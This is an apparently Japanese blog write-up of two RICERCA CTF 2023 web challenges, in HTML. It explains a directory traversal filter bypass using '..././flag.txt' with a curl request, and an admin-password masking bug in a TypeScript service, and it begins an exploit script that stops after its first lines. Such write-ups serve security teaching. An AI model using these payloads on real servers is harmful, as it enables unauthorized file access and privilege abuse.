@@ -1,0 +1,186 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>[RICERCA CTF 2023] My own writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="RICERCA CTF 2023が2023/04/22 10:00 - 2023/04/22 22:00 (UTC+9)で開催されました。
+[web] Cat Café 猫がかわいいですね。
+app.pyは以下です。
+import flask import os app = flask.Flask(__name__) @app.route('/') def index(): return flask.render_template('index.html') @app.route('/img') def serve_image(): filename = flask.request.args.get(&#34;f&#34;, &#34;&#34;).replace(&#34;../&#34;, &#34;&#34;) path = f'images/{filename}' if not os.path.isfile(path): return flask.abort(404) return flask.send_file(path) if __name__ == '__main__': app.run() /imgに該当する部分をみると、[URL]/img?f=01.jpgのようにクエリパラメータを介してimagesディレクトリ内のファイルを取得できることがわかります。
+@app.route('/img') def serve_image(): filename = flask.request.args.get(&#34;f&#34;, &#34;&#34;).replace(&#34;../&#34;, &#34;&#34;) path = f'images/{filename}' if not os.path.isfile(path): return flask.abort(404) return flask.send_file(path) flagが書かれたflag.txtはimagesディレクトリの一つ上の階層にあるため、[URL]/img?f=../flag.txtのようにしてflagが取得することを考えますが、以下の部分で../が空文字に置き換えられるため不可能です。
+filename = flask."><meta property="og:image" content><meta property="og:title" content="[RICERCA CTF 2023] My own writeup"><meta property="og:description" content="RICERCA CTF 2023が2023/04/22 10:00 - 2023/04/22 22:00 (UTC+9)で開催されました。
+[web] Cat Café 猫がかわいいですね。
+app.pyは以下です。
+import flask import os app = flask.Flask(__name__) @app.route('/') def index(): return flask.render_template('index.html') @app.route('/img') def serve_image(): filename = flask.request.args.get(&#34;f&#34;, &#34;&#34;).replace(&#34;../&#34;, &#34;&#34;) path = f'images/{filename}' if not os.path.isfile(path): return flask.abort(404) return flask.send_file(path) if __name__ == '__main__': app.run() /imgに該当する部分をみると、[URL]/img?f=01.jpgのようにクエリパラメータを介してimagesディレクトリ内のファイルを取得できることがわかります。
+@app.route('/img') def serve_image(): filename = flask.request.args.get(&#34;f&#34;, &#34;&#34;).replace(&#34;../&#34;, &#34;&#34;) path = f'images/{filename}' if not os.path.isfile(path): return flask.abort(404) return flask.send_file(path) flagが書かれたflag.txtはimagesディレクトリの一つ上の階層にあるため、[URL]/img?f=../flag.txtのようにしてflagが取得することを考えますが、以下の部分で../が空文字に置き換えられるため不可能です。
+filename = flask."><meta property="og:type" content="article"><meta property="og:url" content="/posts/33/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-04-24T10:19:57+09:00"><meta property="article:modified_time" content="2023-04-24T10:19:57+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="[RICERCA CTF 2023] My own writeup"><meta name=twitter:description content="RICERCA CTF 2023が2023/04/22 10:00 - 2023/04/22 22:00 (UTC+9)で開催されました。
+[web] Cat Café 猫がかわいいですね。
+app.pyは以下です。
+import flask import os app = flask.Flask(__name__) @app.route('/') def index(): return flask.render_template('index.html') @app.route('/img') def serve_image(): filename = flask.request.args.get(&#34;f&#34;, &#34;&#34;).replace(&#34;../&#34;, &#34;&#34;) path = f'images/{filename}' if not os.path.isfile(path): return flask.abort(404) return flask.send_file(path) if __name__ == '__main__': app.run() /imgに該当する部分をみると、[URL]/img?f=01.jpgのようにクエリパラメータを介してimagesディレクトリ内のファイルを取得できることがわかります。
+@app.route('/img') def serve_image(): filename = flask.request.args.get(&#34;f&#34;, &#34;&#34;).replace(&#34;../&#34;, &#34;&#34;) path = f'images/{filename}' if not os.path.isfile(path): return flask.abort(404) return flask.send_file(path) flagが書かれたflag.txtはimagesディレクトリの一つ上の階層にあるため、[URL]/img?f=../flag.txtのようにしてflagが取得することを考えますが、以下の部分で../が空文字に置き換えられるため不可能です。
+filename = flask."><script src=/js/feather.min.js></script>
+<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
+<a href=/posts>Posts</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>[RICERCA CTF 2023] My own writeup</h1><div class=meta>Posted on Apr 24, 2023</div></div><nav id=TableOfContents><ol><li><a href=#web-cat-café>[web] Cat Café</a></li><li><a href=#web-tinydb>[web] tinyDB</a></li></ol></nav><section class=body><p>RICERCA CTF 2023が2023/04/22 10:00 - 2023/04/22 22:00 (UTC+9)で開催されました。</p><h1 id=web-cat-café>[web] Cat Café</h1><p>猫がかわいいですね。</p><p><img src=/images/posts/33/neko.png alt=neko></p><p><code>app.py</code>は以下です。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span><span style=color:#f92672>import</span> flask
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> flask<span style=color:#f92672>.</span>Flask(__name__)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> flask<span style=color:#f92672>.</span>render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/img&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>serve_image</span>():
+</span></span><span style=display:flex><span>    filename <span style=color:#f92672>=</span> flask<span style=color:#f92672>.</span>request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;f&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;../&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)
+</span></span><span style=display:flex><span>    path <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;images/</span><span style=color:#e6db74>{</span>filename<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>isfile(path):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> flask<span style=color:#f92672>.</span>abort(<span style=color:#ae81ff>404</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> flask<span style=color:#f92672>.</span>send_file(path)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run()
+</span></span></code></pre></div><p><code>/img</code>に該当する部分をみると、<code>[URL]/img?f=01.jpg</code>のようにクエリパラメータを介して<code>images</code>ディレクトリ内のファイルを取得できることがわかります。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.py data-lang=.py><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/img&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>serve_image</span>():
+</span></span><span style=display:flex><span>    filename <span style=color:#f92672>=</span> flask<span style=color:#f92672>.</span>request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;f&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;../&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)
+</span></span><span style=display:flex><span>    path <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;images/</span><span style=color:#e6db74>{</span>filename<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>isfile(path):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> flask<span style=color:#f92672>.</span>abort(<span style=color:#ae81ff>404</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> flask<span style=color:#f92672>.</span>send_file(path)
+</span></span></code></pre></div><p>flagが書かれた<code>flag.txt</code>は<code>images</code>ディレクトリの一つ上の階層にあるため、<code>[URL]/img?f=../flag.txt</code>のようにしてflagが取得することを考えますが、以下の部分で<code>../</code>が空文字に置き換えられるため不可能です。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.py data-lang=.py><span style=display:flex><span>filename <span style=color:#f92672>=</span> flask<span style=color:#f92672>.</span>request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;f&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;../&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)
+</span></span></code></pre></div><p>しかし、<code>[URL]/img?f=..././flag.txt</code>のようにすると<code>..././</code>が<code>../</code>に置き換えられるため、flagを取得できます。</p><pre tabindex=0><code>$ curl &#34;http://cat-cafe.2023.ricercactf.com:8000/img?f=..././flag.txt&#34;
+RicSec{directory_traversal_is_one_of_the_most_common_vulnearbilities}
+</code></pre><h1 id=web-tinydb>[web] tinyDB</h1><p>自身の役職を確認する用のページとflagを取得する用のページがあります。</p><p><code>index.ts</code>は以下です。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.ts data-lang=.ts><span style=display:flex><span><span style=color:#66d9ef>import</span> <span style=color:#a6e22e>fastify</span> <span style=color:#66d9ef>from</span> <span style=color:#e6db74>&#34;fastify&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> { <span style=color:#a6e22e>fastifySession</span> } <span style=color:#66d9ef>from</span> <span style=color:#e6db74>&#34;@fastify/session&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> <span style=color:#a6e22e>fastifyCookie</span> <span style=color:#66d9ef>from</span> <span style=color:#e6db74>&#34;@fastify/cookie&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>as</span> <span style=color:#a6e22e>fs</span> <span style=color:#66d9ef>from</span> <span style=color:#e6db74>&#34;fs&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> { <span style=color:#a6e22e>getUserDB</span>, <span style=color:#a6e22e>randStr</span>, <span style=color:#a6e22e>getAdminPW</span>, <span style=color:#a6e22e>updateAdminPW</span> } <span style=color:#66d9ef>from</span> <span style=color:#e6db74>&#34;./db&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> <span style=color:#a6e22e>flag</span> <span style=color:#66d9ef>from</span> <span style=color:#e6db74>&#34;./flag&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>server</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>fastify</span>();
+</span></span><span style=display:flex><span><span style=color:#a6e22e>server</span>.<span style=color:#a6e22e>register</span>(<span style=color:#a6e22e>fastifyCookie</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>server</span>.<span style=color:#a6e22e>register</span>(<span style=color:#a6e22e>fastifySession</span>, {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>secret</span>: <span style=color:#66d9ef>randStr</span>(),
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cookie</span><span style=color:#f92672>:</span> { <span style=color:#a6e22e>secure</span>: <span style=color:#66d9ef>false</span> },
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>server</span>.<span style=color:#66d9ef>get</span>(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>_</span>, <span style=color:#a6e22e>response</span>) <span style=color:#f92672>=&gt;</span> {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>html</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>promises</span>.<span style=color:#a6e22e>readFile</span>(<span style=color:#e6db74>&#34;./src/index.html&#34;</span>, <span style=color:#e6db74>&#34;utf-8&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>response</span>.<span style=color:#66d9ef>type</span>(<span style=color:#e6db74>&#34;text/html&#34;</span>).<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>html</span>);
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>server</span>.<span style=color:#66d9ef>get</span>(<span style=color:#e6db74>&#34;/admin&#34;</span>, <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>_</span>, <span style=color:#a6e22e>response</span>) <span style=color:#f92672>=&gt;</span> {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>html</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>promises</span>.<span style=color:#a6e22e>readFile</span>(<span style=color:#e6db74>&#34;./src/admin.html&#34;</span>, <span style=color:#e6db74>&#34;utf-8&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>response</span>.<span style=color:#66d9ef>type</span>(<span style=color:#e6db74>&#34;text/html&#34;</span>).<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>html</span>);
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>type</span> <span style=color:#a6e22e>UserBodyT</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>Partial</span>&lt;<span style=color:#f92672>AuthT</span>&gt;;
+</span></span><span style=display:flex><span><span style=color:#a6e22e>server</span>.<span style=color:#a6e22e>post</span><span style=color:#f92672>&lt;</span>{ <span style=color:#a6e22e>Body</span>: <span style=color:#66d9ef>UserBodyT</span> }<span style=color:#f92672>&gt;</span>(<span style=color:#e6db74>&#34;/set_user&#34;</span>, <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>request</span>, <span style=color:#a6e22e>response</span>) <span style=color:#f92672>=&gt;</span> {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>password</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>request</span>.<span style=color:#a6e22e>body</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>session</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>request</span>.<span style=color:#a6e22e>session</span>.<span style=color:#a6e22e>sessionId</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>userDB</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>getUserDB</span>(<span style=color:#a6e22e>session</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>auth</span> <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>username</span>: <span style=color:#66d9ef>username</span> <span style=color:#f92672>??</span> <span style=color:#e6db74>&#34;admin&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>password</span>: <span style=color:#66d9ef>password</span> <span style=color:#f92672>??</span> <span style=color:#a6e22e>randStr</span>(),
+</span></span><span style=display:flex><span>  };
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>userDB</span>.<span style=color:#a6e22e>has</span>(<span style=color:#a6e22e>auth</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>userDB</span>.<span style=color:#66d9ef>set</span>(<span style=color:#a6e22e>auth</span>, <span style=color:#e6db74>&#34;guest&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>userDB</span>.<span style=color:#a6e22e>size</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>10</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// Too many users, clear the database
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>userDB</span>.<span style=color:#a6e22e>clear</span>();
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>auth</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;admin&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>auth</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>getAdminPW</span>();
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>userDB</span>.<span style=color:#66d9ef>set</span>(<span style=color:#a6e22e>auth</span>, <span style=color:#e6db74>&#34;admin&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>auth</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;*&#34;</span>.<span style=color:#a6e22e>repeat</span>(<span style=color:#a6e22e>auth</span>.<span style=color:#a6e22e>password</span>.<span style=color:#a6e22e>length</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>rollback</span> <span style=color:#f92672>=</span> () <span style=color:#f92672>=&gt;</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>grade</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>userDB</span>.<span style=color:#66d9ef>get</span>(<span style=color:#a6e22e>auth</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>updateAdminPW</span>();
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>newAdminAuth</span> <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>username</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;admin&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>password</span>: <span style=color:#66d9ef>getAdminPW</span>(),
+</span></span><span style=display:flex><span>    };
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>userDB</span>.<span style=color:#66d9ef>delete</span>(<span style=color:#a6e22e>auth</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>userDB</span>.<span style=color:#66d9ef>set</span>(<span style=color:#a6e22e>newAdminAuth</span>, <span style=color:#a6e22e>grade</span> <span style=color:#f92672>??</span> <span style=color:#e6db74>&#34;guest&#34;</span>);
+</span></span><span style=display:flex><span>  };
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>setTimeout</span>(() <span style=color:#f92672>=&gt;</span> {
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// Admin password will be changed due to hacking detected :(
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>auth</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;admin&#34;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>auth</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>!==</span> <span style=color:#a6e22e>getAdminPW</span>()) {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>rollback</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }, <span style=color:#ae81ff>2000</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>3000</span> <span style=color:#f92672>*</span> Math.<span style=color:#a6e22e>random</span>()); <span style=color:#75715e>// no timing attack!
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>res</span> <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>authId</span>: <span style=color:#66d9ef>auth.username</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>authPW</span>: <span style=color:#66d9ef>auth.password</span>,
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>grade</span>: <span style=color:#66d9ef>userDB.get</span>(<span style=color:#a6e22e>auth</span>),
+</span></span><span style=display:flex><span>  };
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>response</span>.<span style=color:#66d9ef>type</span>(<span style=color:#e6db74>&#34;application/json&#34;</span>).<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>res</span>);
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>server</span>.<span style=color:#a6e22e>post</span><span style=color:#f92672>&lt;</span>{ <span style=color:#a6e22e>Body</span>: <span style=color:#66d9ef>AuthT</span> }<span style=color:#f92672>&gt;</span>(<span style=color:#e6db74>&#34;/get_flag&#34;</span>, <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>request</span>, <span style=color:#a6e22e>response</span>) <span style=color:#f92672>=&gt;</span> {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>password</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>request</span>.<span style=color:#a6e22e>body</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>session</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>request</span>.<span style=color:#a6e22e>session</span>.<span style=color:#a6e22e>sessionId</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>userDB</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>getUserDB</span>(<span style=color:#a6e22e>session</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>const</span> [<span style=color:#a6e22e>auth</span>, <span style=color:#a6e22e>grade</span>] <span style=color:#66d9ef>of</span> <span style=color:#a6e22e>userDB</span>.<span style=color:#a6e22e>entries</span>()) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>auth</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>username</span> <span style=color:#f92672>&amp;&amp;</span>
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>auth</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>password</span> <span style=color:#f92672>&amp;&amp;</span>
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>grade</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;admin&#34;</span>
+</span></span><span style=display:flex><span>    ) {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>response</span>
+</span></span><span style=display:flex><span>        .<span style=color:#66d9ef>type</span>(<span style=color:#e6db74>&#34;application/json&#34;</span>)
+</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>send</span>({ <span style=color:#a6e22e>flag</span><span style=color:#f92672>:</span> <span style=color:#e6db74>`great! here is your flag: </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>flag</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span> });
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>response</span>.<span style=color:#66d9ef>type</span>(<span style=color:#e6db74>&#34;application/json&#34;</span>).<span style=color:#a6e22e>send</span>({ <span style=color:#a6e22e>flag</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;no flag for you :)&#34;</span> });
+</span></span><span style=display:flex><span>});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>server</span>.<span style=color:#a6e22e>listen</span>({ <span style=color:#a6e22e>host</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;0.0.0.0&#34;</span>, <span style=color:#a6e22e>port</span>: <span style=color:#66d9ef>8888</span> }, (<span style=color:#a6e22e>_</span>, <span style=color:#a6e22e>address</span>) <span style=color:#f92672>=&gt;</span> {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`Server listening at </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>address</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p><code>/set_user</code>で行われる処理は以下です。</p><ul><li><code>username</code>と<code>password</code>を受け取り、セッションごとにユーザー情報を保存する。</li><li>ユーザーの件数が10件を超えると、データベースをクリアし、<code>admin</code>のパスワードを更新する。</li><li><code>admin</code>のパスワードが正しくない場合は2〜5秒後に<code>rollback()</code>が実行される。</li><li><code>rollback()</code>では、<code>admin</code>のパスワードが更新される。</li></ul><p><code>/get_flag</code>で行われる処理は以下です。</p><ul><li>セッションに紐づいて保存されているユーザー情報を全て取得。</li><li>入力の<code>username</code>と<code>password</code>が合致し、<code>grade</code>が<code>admin</code>のものがあればflagが得られる。</li></ul><p>ここで、<code>/set_user</code>の<code>admin</code>のパスワードを更新する処理に脆弱性があります。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.ts data-lang=.ts><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>userDB</span>.<span style=color:#a6e22e>size</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>10</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// Too many users, clear the database
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>userDB</span>.<span style=color:#a6e22e>clear</span>();
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>auth</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;admin&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>auth</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>getAdminPW</span>();
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>userDB</span>.<span style=color:#66d9ef>set</span>(<span style=color:#a6e22e>auth</span>, <span style=color:#e6db74>&#34;admin&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>auth</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;*&#34;</span>.<span style=color:#a6e22e>repeat</span>(<span style=color:#a6e22e>auth</span>.<span style=color:#a6e22e>password</span>.<span style=color:#a6e22e>length</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>ここでは、<code>auth.password</code>に<code>getAdminPW()</code>で取得したパスワードを代入し、mapである<code>userDB</code>にセットします。その後、パスワードの長さ分の<code>*</code>を<code>auth.password</code>に代入する。しかし、javascriptの性質により、<code>userDB</code>にセットされた<code>auth</code>オブジェクトと、その後の<code>auth</code>オブジェクトは同じオブジェクトへの参照を保持します（<a href=https://ja.javascript.info/object-copy>参考</a>）。</p><p>そのため、<code>auth.password = "*".repeat(auth.password.length);</code>とした時に、<code>userDB</code>に保存されている<code>auth</code>オブジェクトの<code>auth.password</code>も<code>"*".repeat(auth.password.length)</code>に書き換えられます。</p><p><code>admin</code>のパスワードが異なる場合に、パスワードを更新する<code>rollback()</code>は2~5秒後に実行されます。そのため、<code>rollback()</code>が実行されるまでに<code>username</code>を<code>admin</code>、<code>password</code>を<code>"*".repeat(auth.password.length)</code>として<code>/get_flag</code>を叩くことでflagを取得することができます。</p><p>以下のスクリプトを実行することでflagが取得できます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span><span style=color:#f92672>import</span> requests
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>base_url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://tinydb.2023.ricercactf.com:8888&#39;</span>
+</span></span><span style=display:flex><span>
